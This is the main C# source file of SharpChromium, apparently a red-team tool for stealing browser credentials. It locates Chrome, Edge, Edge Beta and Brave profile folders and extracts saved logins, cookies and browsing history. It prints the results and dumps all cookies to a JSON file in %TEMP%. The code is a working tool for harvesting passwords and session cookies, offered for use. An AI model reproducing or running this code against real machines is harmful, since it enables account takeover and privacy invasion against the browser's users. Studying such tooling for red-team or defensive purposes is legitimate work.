using System;
using System.Data;
using System.Collections;
using System.Collections.Generic;
using System.Threading;
using System.Security.Cryptography;
using System.Text;
using System.Diagnostics;
using System.Security.Principal;
using System.IO;
using System.Reflection;

namespace SharpChromium
{
    using CS_SQLite3;
    class Program
    {
        static void Usage()
        {
            string banner = @"
Usage:
    .\SharpChromium.exe arg0 [arg1 arg2 ...]

Arguments:
    all       - Retrieve all Chromium Cookies, History and Logins.
    full      - The same as 'all'
    logins    - Retrieve all saved credentials that have non-empty passwords.
    history   - Retrieve user's history with a count of each time the URL was
                visited, along with cookies matching those items.
    cookies [domain1.com domain2.com] - Retrieve the user's cookies in JSON format.
                                        If domains are passed, then return only
                                        cookies matching those domains. Otherwise,
                                        all cookies are saved into a temp file of
                                        the format ""%TEMP%\$browser-cookies.json""
";

            Console.WriteLine(banner);
        }

        static bool getCookies = false;
        static bool getHistory = false;
        static bool getBookmarks = false;
        static bool getLogins = false;
        static bool useTmpFile = false;
        static bool useBCryptDecryption = false;
        static List<String> domains = new List<String>();
        static void Main(string[] args)
        {
            // Path builder for Chrome install location
            string homeDrive = System.Environment.GetEnvironmentVariable("HOMEDRIVE");
            string homePath = System.Environment.GetEnvironmentVariable("HOMEPATH");
            string localAppData = System.Environment.GetEnvironmentVariable("LOCALAPPDATA");

            string[] paths = new string[4];
            
            paths[0] = localAppData + "\\Google\\Chrome\\User Data\\";
            paths[1] = localAppData + "\\Microsoft\\Edge\\User Data\\";
            paths[2] = localAppData + "\\Microsoft\\Edge Beta\\User Data\\";
            // AppData\\Local\BraveSoftware\Brave-Browser\User Data\
            paths[3] = localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\";

            string[] validArgs = { "all", "full", "logins", "history", "cookies" };

            


            if (args.Length == 0)
            {
                Usage();
                return;
            }

            // Parse the arguments.
            for (int i = 0; i < args.Length; i++)
            {
                // Valid arg!
                string arg = args[i].ToLower();
                if (Array.IndexOf(validArgs, arg) != -1)
                {
                    if (arg == "all" || arg == "full")
                    {
                        getCookies = true;
                        getHistory = true;
                        getLogins = true;
                    }
                    else if (arg == "logins")
                    {
                        getLogins = true;
                    }
                    else if (arg == "history")
                    {
                        getHistory = true;
                    }
                    else if (arg == "cookies")
                    {
                        getCookies = true;
                    }
                    else
                    {
                        Console.WriteLine("[X] Invalid argument passed: {0}", arg);
                    }
                }
                else if (getCookies && arg.Contains("."))
                {
                    // must be a domain!
                    domains.Add(arg);
                }
                else
                {
                    Console.WriteLine("[X] Invalid argument passed: {0}", arg);
                }
            }

            if (!getCookies && !getHistory && !getLogins)
            {
                Usage();
                return;
            }

            foreach (string path in paths)
            {
                if (Directory.Exists(path))
                {
                    string browser = "";
                    string fmtString = "[*] {0} {1} extraction.\n";
                    if (path.ToLower().Contains("chrome"))
                    {
                        browser = "Google Chrome";
                    } else if (path.ToLower().Contains("edge beta"))
                    {
                        browser = "Edge Beta";
                    } else
                    {
                        browser = "Edge";
                    }
                    Console.WriteLine(string.Format(fmtString, "Beginning", browser));
                    // do something
                    ExtractData(path, browser);
                    Console.WriteLine(string.Format(fmtString, "Finished", browser));
                }
            }

            Console.WriteLine("[*] Done.");

        }

        static void ExtractData(string path, string browser)
        {
            ChromiumCredentialManager chromeManager = new ChromiumCredentialManager(path);
            // Main loop, path parsing and high integrity check taken from GhostPack/SeatBelt
            string[] domainArray = domains.ToArray();
            try
            {
                if (getCookies)
                {
                    var cookies = chromeManager.GetCookies();
                    if (domainArray != null && domainArray.Length > 0)
                    {
                        foreach (var domain in domainArray)
                        {
                            var subCookies = HostCookies.FilterHostCookies(cookies, domain);
                            subCookies.Print();
                        }
                    }
                    else
                    {
                        string totalResults = "";
                        foreach (var cookie in cookies)
                        {
                            string jsonArray = cookie.ToJSON();
                            string jsonItems = jsonArray.Trim(new char[] { '[', ']', '\n' });
                            totalResults += jsonItems + ",\n";
                            // cookie.Print();
                        }
                        totalResults = totalResults.Trim(new char[] { ',', '\n' });
                        totalResults = "[" + totalResults + "]";
                        string filePath = Environment.GetEnvironmentVariable("TEMP") + string.Format("\\{0}-cookies.json", browser.ToLower().Replace(" ", "-"));
                        try
                        {
                            File.WriteAllText(filePath, totalResults);
                            Console.WriteLine("\n[*] All cookies written to {0}", filePath);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("[X] Exception occurred while writing cookies to file: {0}\n{1}", ex.Message, ex.StackTrace);
                        }
                    }
                }

                if (getHistory)
                {
                    var history = chromeManager.GetHistory();
                    foreach (var item in history)
                    {
                        item.Print();
                    }
                }

                if (getLogins)
                {
                    var logins = chromeManager.GetSavedLogins();
                    foreach (var login in logins)
                    {
                        login.Print();
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception: {0}\n\n{1}", ex.Message, ex.StackTrace);
            }
        }
    }
}
